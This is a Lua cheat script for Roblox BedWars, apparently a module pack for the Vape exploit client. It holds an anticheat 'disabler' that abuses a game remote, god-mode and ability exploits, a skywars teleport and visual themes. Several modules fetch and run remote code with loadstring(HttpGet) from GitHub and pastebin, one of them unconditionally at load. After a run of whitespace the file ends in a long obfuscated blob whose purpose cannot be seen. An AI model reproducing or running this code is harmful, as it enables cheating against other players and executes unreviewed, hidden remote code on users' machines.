		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 0<bd then bl=1 else be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring end else if bd==2 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 2~=bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 4<bk then cx=1 else for bj=0,cv-1 do cw[bj]=bg(bj)end end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 2~=bj then cx=cx+1 else da=bh(be(bi,cx,cx+cz-1),36)end end else if bj<=3 then cx=(cx+cz)else if bj<5 then return da else break end end end bj=bj+1 end end else if bk<8 then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while((cx<#bi)and not(#a~=d))do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=(cs..be(ct,1,1))cu[(#cu+1)],cs,cv=ct,ct,cv+1 end else if bk<11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 4<bd then c={o,j,s,u,q,x,w,l,k,y,i,m,nil};else bo={}end else if bd<=6 then bp=v else if bd~=8 then bq=bp(bo)else br,bs=1,((-16127+(function()local a,b=0,1;local a=(function(c,d)c(d(c,d),c(d and d,c)and c(c and c,d))end)(function(c,d)if a>333 then return d end a=a+1 b=(b*544)%15399 if(b%584)>292 then return d(c(d,d),d(d,c and d)and d(c,d))else return d end return c end,function(c,d)if a>384 then return d end a=a+1 b=(b*510)%42755 if(b%926)<463 then b=(b-567)%20546 return d(c(d,c),d(d,d))else return c end return d end)return b;end)()))end end end end else if bd<=12 then if bd<=10 then if bd<10 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c>0 then for q=0,31 do local s=(a%2)local v=(b%2)if not(s~=0)then if not(v~=1)then b=b-1 d=(d+2^q)end else a=(a-1)if not(v~=0)then d=(d+2^q)else b=(b-1)end end b=(b/2)a=a/2 end else d=0 end else if 2<c then break else return d end end c=c+1 end end end else if bd~=12 then bv=function(a,b)local c=0 while true do if c~=1 then return(a*(2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if a<1 then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=(br+2);else if a>3 then break else return((bv(c,8))+b);end end end a=a+1 end end end end else if bd<=14 then if bd<14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 1>c then return p(a/2^b);else break end c=c+1 end end else if bd==16 then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if c<1 then return(((a+b)-bu(a,b)))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18==bd then cb=bw()else cc=function(a,b)local c=0 while true do if c~=1 then return(bz-ca((bz-a),bz-b))else break end c=c+1 end end end else if bd==20 then cd=function(a,b,c)local d=0 while true do if d>0 then break else if c then local c=((a/2^(b-1))%2^((c-1)-(b-1)+1))return(c-c%1)else local b=2^(b-1)return((a%(b+b)>=b)and 1 or 0)end end d=d+1 end end else ce=bw()end end else if bd<=23 then if 23>bd then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0<a then b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);else b,c,d,p=h(bn,br,br+3)end else if a<=2 then br=(br+4);else if a==3 then return((bv(p,24)+bv(d,16)+bv(c,8)))+b;else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 1~=a then b=bu(h(bn,br,br),cb)else br=br+1;end else if 3~=a then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd<26 then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 28~=bd then cj=((-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 1>a then b=409 else c=818 end else if a~=3 then d=28939 else p=222 end end else if a<=5 then if 4<a then s=38485 else q=389 end else if a>6 then w=583 else v=1166 end end end else if a<=11 then if a<=9 then if 8==a then x=9454 else y=425 end else if a<11 then be=4509 else bf=442 end end else if a<=13 then if a<13 then bg=292 else bh=3 end else if a<15 then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if 17~=a then bk=579 else bs=10108 end else if 19~=a then bw=252 else by=908 end end else if a<=21 then if a>20 then ca=470 else bz=5205 end else if a==22 then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if a==24 then cs=18568 else ct=2 end else if a==26 then cu=1 else cv=421 end end else if a<=29 then if a>28 then cx,cy=cw,cu else cw=0 end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if 0==de then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd((db and da),dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if(cx>cv)then local cv=cw while true do cv=(cv+cu)if((cv<ct))then return db else break end end end else if de==1 then cx=cx+cu else cy=(cy+cc)%cs end end else if de<=3 then if((not((cy%ce)~=by)or((cy%ce)>by)))then local by=cw while true do by=(by+cu)if((by==cu or by<cu))then cy=(cy-ca)%bz else if not(by~=ct)then return db(da(dc,da,da,(db and dc)),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),((da(dc,(dd and db),db and dc,da)and da((dc and dd),(dc and da),dd,dc))))else break end end end else local by=cw while true do by=(by+cu)if not(not(by==ct))then break else return da end end end else if de==4 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if cx>bw then local bw=cw while true do bw=bw+cu if not(not(bw==ct))then break else return by end end end else if cs~=2 then cx=cx+cu else cy=((cy-bk)%bs)end end else if cs<=3 then if((((cy%bi)==bj)or((cy%bi)>bj)))then local bi=cw while true do bi=bi+cu if(bi==ct or(bi>ct))then if(bi<bh)then return cc else break end else cy=(((cy*bg))%be)end end else local be=cw while true do be=(be+cu)if(be<ct)then return by(bz(ce and bz,by and bz,(cc and by),by),(ce(bz,ce,bz,((cc and ce)))and cc(cc,ce,cc,cc)),(cc(ce,(by and ce),by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if cs<5 then return by(cc(cc,bz,cc and by,ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,(by and by),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local 